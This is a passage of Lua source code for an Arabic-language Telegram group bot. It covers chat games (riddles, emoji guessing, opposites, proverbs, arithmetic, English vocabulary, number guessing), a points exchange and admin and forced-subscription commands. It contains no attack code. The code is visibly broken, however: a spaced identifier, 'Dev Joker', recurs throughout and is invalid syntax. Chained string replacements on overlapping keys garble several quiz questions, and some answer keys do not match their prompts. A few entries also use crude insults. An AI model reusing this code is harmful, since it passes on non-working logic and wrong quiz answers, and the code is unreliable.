name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
ABS_PROX = '⌁︙اول واحد يحلها {'..name..'} يربح '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(Dev Joker..'bot:bkbk'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(Dev Joker..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(Dev Joker..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '⌁︙لقد ربحت وحصلت على نقطة \n⌁︙ارسل ( حزوره ) للعب مره اخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(Dev Joker..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'المعاني' and ChCheck(msg) or text == 'معاني' and ChCheck(msg) then
if not DevAbs:get(Dev Joker..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs:del(Dev Joker..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Dev Joker..'bot:bkbk2'..msg.chat_id_,name)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
ABS_PROX = '⌁︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(Dev Joker..'bot:bkbk2'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(Dev Joker..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(Dev Joker..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '⌁︙لقد ربحت وحصلت على نقطة \n⌁︙ارسل ( المعاني ) للعب مره اخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(Dev Joker..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'العكس' and ChCheck(msg) or text == 'عكس' and ChCheck(msg) then
if not DevAbs:get(Dev Joker..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs:del(Dev Joker..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Dev Joker..'bot:bkbk3'..msg.chat_id_,name)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'محلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'حي','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
ABS_PROX = '⌁︙ما هو عكس كلمة ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(Dev Joker..'bot:bkbk3'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(Dev Joker..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(Dev Joker..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '⌁︙لقد ربحت وحصلت على نقطة \n⌁︙ارسل ( العكس ) للعب مره اخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(Dev Joker..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'المختلف' and ChCheck(msg) or text == 'مختلف' and ChCheck(msg) then
if not DevAbs:get(Dev Joker..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs:del(Dev Joker..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Dev Joker..'bot:bkbk4'..msg.chat_id_,name)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟⭐️🌟')
name = string.gsub(name,'📥','💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃️☃️☃️☃️⛄️☃️☃️☃️☃️')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀️','🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️')
name = string.gsub(name,'🧚‍♂️','🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♂️🧚‍♀️🧚‍♀️')
name = string.gsub(name,'🧝‍♂️','🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♂️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕓','🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
ABS_PROX = '⌁︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(Dev Joker..'bot:bkbk4'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(Dev Joker..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(Dev Joker..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '⌁︙لقد ربحت وحصلت على نقطة \n⌁︙ارسل ( المختلف ) للعب مره اخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(Dev Joker..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'امثله' and ChCheck(msg) or text == 'الامثله' and ChCheck(msg) then
if not DevAbs:get(Dev Joker..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Dev Joker..'bot:bkbk5'..msg.chat_id_,name)
DevAbs:del(Dev Joker..'bot:l:id'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من ___ نعال')
name = string.gsub(name,'شقره','مع الخيل يا ___ ')
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قلة ___ شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يكول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتى لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمة ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
name = string.gsub(name,'القرد',' ___ بعين امه غزال')
name = string.gsub(name,'يكحله','اجه ___ عماها')
ABS_PROX = '⌁︙اكمل المثال التالي ↫ ['..name..']'
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(Dev Joker..'bot:bkbk5'..msg.chat_id_) or 'qssp')..'' then
if not DevAbs:get(Dev Joker..'bot:l:id'..msg.chat_id_) then 
DevAbs:incrby(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(Dev Joker..'bot:bkbk5'..msg.chat_id_)
ABS_PROX = '⌁︙لقد ربحت وحصلت على نقطة \n⌁︙ارسل ( امثله ) للعب مره اخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end
DevAbs:set(Dev Joker..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'رياضيات' and ChCheck(msg) or text == 'الرياضيات' and ChCheck(msg) then
if not DevAbs:get(Dev Joker..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Dev Joker..'bot:bkbk6'..msg.chat_id_,name)
DevAbs:del(Dev Joker..'bot:l:id'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
ABS_PROX = '⌁︙اكمل المعادله التاليه \n{'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(Dev Joker..'bot:bkbk6'..msg.chat_id_) or 'qssp')..'' then
if not DevAbs:get(Dev Joker..'bot:l:id'..msg.chat_id_) then 
DevAbs:incrby(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(Dev Joker..'bot:bkbk6'..msg.chat_id_)
ABS_PROX = '⌁︙لقد ربحت وحصلت على نقطة \n⌁︙ارسل ( رياضيات ) للعب مره اخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end
DevAbs:set(Dev Joker..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'الانكليزي' and ChCheck(msg) or text == 'الانجليزيه' and ChCheck(msg) or text == 'انكليزيه' and ChCheck(msg) then
if not DevAbs:get(Dev Joker..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Dev Joker..'bot:bkbk7'..msg.chat_id_,name)
DevAbs:del(Dev Joker..'bot:l:id'..msg.chat_id_)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid')
name = string.gsub(name,'صداقه','Friendchip')
ABS_PROX = '⌁︙ما معنى كلمة ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(Dev Joker..'bot:bkbk7'..msg.chat_id_) or 'qssp')..'' then
if not DevAbs:get(Dev Joker..'bot:l:id'..msg.chat_id_) then 
DevAbs:incrby(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(Dev Joker..'bot:bkbk7'..msg.chat_id_)
ABS_PROX = '⌁︙لقد ربحت وحصلت على نقطة \n⌁︙ارسل ( انكليزيه ) للعب مره اخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end
DevAbs:set(Dev Joker..'bot:l:id'..msg.chat_id_,true)
end  
--     Source Joker     --
if DevAbs:get(Dev Joker.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Abs(msg.chat_id_, msg.id_, 1,"⌁︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevAbs:get(Dev Joker.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAbs:del(Dev Joker..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevAbs:del(Dev Joker.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
DevAbs:incrby(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙*التخمين الصحيح هو* ↫ '..NUM..'\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAbs:incrby(Dev Joker..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevAbs:get(Dev Joker..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevAbs:del(Dev Joker..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevAbs:del(Dev Joker.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n⌁︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevAbs:get(Dev Joker..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevAbs:get(Dev Joker..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
if text == 'خمن' and ChCheck(msg) or text == 'تخمين' and ChCheck(msg) then   
if not DevAbs:get(Dev Joker..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
Num = math.random(1,20)
DevAbs:set(Dev Joker.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n⌁︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevAbs:setex(Dev Joker.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source Joker     --
if text == 'الالعاب' and ChCheck(msg) or text == 'العاب' and ChCheck(msg) or text == 'اللعبه' and ChCheck(msg) then
if not DevAbs:get(Dev Joker..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الالعاب معطلة في المجموعة', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1,[[
⌁︙قائمة العاب المجموعة ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙لعبة التخمين ↫ خمن
⌁︙لعبة الامثله ↫ امثله
⌁︙لعبة العكس ↫ العكس
⌁︙لعبة الحزوره ↫ حزوره
⌁︙لعبة الترتيب ↫ ترتيب
⌁︙لعبة المعاني ↫ معاني
⌁︙لعبة المختلف ↫ المختلف
⌁︙لعبة السمايلات ↫ سمايلات
⌁︙لعبة المحيبس ↫ المحيبس
⌁︙لعبة الرياضيات ↫ رياضيات
⌁︙لعبة الانكليزيه ↫ انكليزيه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙نقاطي • بيع نقاطي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/So_Victor)
]], 1, 'md')
end
end
--     Source Joker     --
if text == 'بيع نقاطي' and ChCheck(msg) then
if tonumber((DevAbs:get(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙ليس لديك نقاط العب اولا\n⌁︙ارسل ( الالعاب ) للعب', 1, 'md')
else
DevAbs0 = (DevAbs:get(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) * 50)
DevAbs:incrby('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,DevAbs0)  
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙تم بيع '..(DevAbs:get(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n⌁︙كل نقطه تساوي 50 رساله', 'md')
DevAbs:del(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source Joker     --
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" or text == "وضع قناة الاشتراك" then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbs:setex(Dev Joker..'DevAbs4'..msg.sender_user_id_,300,true)
Dev_Abs(msg.chat_id_,msg.id_, 1, "⌁︙*ارسل لي معرف قناة الاشتراك الان*", 1 , "md")
end end
if text == "حذف قناة الاشتراك" and is_leader(msg) or text == "حذف قناه الاشتراك" and is_leader(msg) then  
DevAbs:del(Dev Joker..'DevAbs3')
DevAbs:del(Dev Joker.."DevAbs2")
text = "⌁︙تم حذف قناة الاشتراك الاجباري"
Dev_Abs(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == 'تفعيل الاشتراك الاجباري' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
if not DevAbs:get(Dev Joker..'DevAbs3') then
Dev_Abs(msg.chat_id_,msg.id_, 1, "⌁︙لم يتم تعيين قناة الاشتراك الاجباري \n⌁︙ارسل (تعيين قناة الاشتراك) للتعيين ", 1 , "md")
return false 
end
if DevAbs:get(Dev Joker..'DevAbs3') then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الاشتراك الاجباري'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker.."DevAbs2", true)
return false end end end
if text == 'تعطيل الاشتراك الاجباري' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الاشتراك الاجباري'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker.."DevAbs2")
return false 
end end
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else
local DevAbs5 = DevAbs:get(Dev Joker.."DevAbs3")
if DevAbs5 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙قناة الاشتراك ↫ '..DevAbs5..'', 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم تعيين قناة الاشتراك الاجباري \n⌁︙ارسل (تعيين قناة الاشتراك) للتعيين ', 1, 'md')
end end end
--     Source Joker     --
if text == 'رفع المشرفين' and ChCheck(msg) or text == 'رفع الادمنيه' and ChCheck(msg) then  
local function promote_admin(extra, result, success)  
DevAbs:del(Dev Joker..'abs:absmonsh:'..msg.chat_id_)
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
DevAbs:sadd(Dev Joker..'abs:admins:'..msg.chat_id_, admins[i].user_id_)   
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  
owner_id = admins[i].user_id_  
DevAbs:sadd(Dev Joker..'abs:monsh:'..msg.chat_id_,owner_id)  
DevAbs:sadd(Dev Joker..'abs:absmonsh:'..msg.chat_id_,owner_id)   
end  
end  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم رفع '..num..' ادمن هنا \n⌁︙تم رفع منشئ المجموعة', 1, 'md')
end
getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
end
--     Source Joker     --
if is_SudoBot(msg.sender_user_id_, msg.chat_id_) then
if text ==  ""..name_bot..' غادر' or text == 'غادر' then
if DevAbs:get(Dev Joker.."Left:Bot"..bot_id) and not is_leader(msg) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "⌁︙المغادره معطله من قبل المطور الاساسي", 1, 'md')
return false  
end
